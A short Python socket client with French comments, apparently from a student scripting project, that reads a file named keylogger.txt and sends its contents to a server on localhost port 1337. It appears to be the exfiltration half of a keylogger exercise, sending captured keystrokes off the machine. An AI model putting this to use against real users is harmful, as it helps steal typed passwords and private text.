import socket
import os
import time

def start_client():
    host = 'localhost'
    port = 1337
    hostname = socket.gethostname()

    # Création du socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connexion au serveur
        s.connect((host, port))
        
        # Envoi du chemin du fichier au serveur
        file_path = '/home/quentin/Documents/ESGI/ScriptPython/Projet/keylogger.txt'
        print(f"Envoi du fichier {file_path} au serveur...")

        time.sleep(1) # Attente de 1 seconde
        
        # Lecture du fichier et envoi des données
        with open(file_path, 'rb') as file:
            file_data = file.read()
            s.sendall(file_data)

        print("Le fichier a été envoyé avec succès.")
    finally:
        # Fermeture du socket dans un bloc finally pour assurer la fermeture même en cas d'erreur
        s.close()

if __name__ == '__main__':
    start_client()
